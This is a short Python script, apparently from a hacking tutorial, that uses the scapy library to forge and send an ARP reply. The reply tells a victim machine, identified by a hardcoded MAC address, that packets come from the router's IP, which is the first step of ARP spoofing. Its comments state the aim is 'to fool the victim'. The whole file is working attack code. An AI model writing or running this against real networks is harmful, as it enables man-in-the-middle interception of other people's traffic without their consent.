#!/usr/bin/env python

import scapy.all as scapy


def spoof(target_ip, spoof_ip):
    # pdst = victim ip address
    # hwdst = victim mac address
    # psrc = router ip
    # This tells the victim that the packet has been sent from router. To fool the victim
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="00:0C:29:66:36:87", psrc=spoof_ip)
    scapy.send(packet)